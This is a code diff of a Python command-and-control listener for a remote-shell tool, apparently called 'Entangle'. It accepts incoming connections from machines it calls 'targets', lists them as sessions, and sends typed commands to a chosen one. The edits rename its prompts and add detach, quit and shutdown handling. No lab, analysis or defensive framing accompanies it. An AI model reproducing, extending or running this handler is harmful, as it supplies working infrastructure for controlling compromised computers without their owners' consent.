@@ -22,12 +22,20 @@ def shell(target,ip):
     global count
 
     while True:
-        command = raw_input("EntangleShell# " )
+        command = raw_input("Session~# " )
         send(command)
         if command == "":
             continue
-        elif command == 'q':
+
+        elif command == 'detach':
             break
+
+        elif command == "quit":
+            target.close()
+            targets.remove(target)
+            ips.remove(ip)
+            break
+
         elif command[:2] == "cd" and len(command) > 1:
             continue
         else:
@@ -40,12 +48,13 @@ def server():
     while True:
         if stop_threads:
             break
-        s.settimeout(1)
+        #s.settimeout(1)
         try:
             target, ip = s.accept()
             targets.append(target)
             ips.append(ip)
-            print(str(targets[clients]) + " --- " + str(ips[clients]) + " Has Connected!")
+            print ("**** " + ip[0] + " Has Connected ****")
+            #print(str(ips[clients]) + " Has Connected!")
             clients += 1
         except:
             pass
@@ -68,18 +77,26 @@ t1 = threading.Thread(target=server)
 t1.start()
 
 while True:
-    command = raw_input("* Center: ")
-    if command == "targets":
+    command = raw_input("Entangle: ")
+    if command == "show":
        count = 0
        for ip in ips:
-           print ("Session " + str(count) + " . <---> " + str(ip))
+           print ("Session " + str(count) + " ----> " + str(ip))
            count +=1
+
     elif command[:7] == "session":
         try:
-            num = int(command[8:])
+            num = int(command[7:])
             tarnum = targets[num]
             tarip = ips[num]
             shell(tarnum,tarip)
         except:
-            print ("Session Not Found")
-
+            print("Session not %s Found!" % num)
+            continue
+    elif command == "exit":
+        for target in targets:
+            target.close()
+        s.close()
+        stop_threads = True
+        t1.join()
+        break
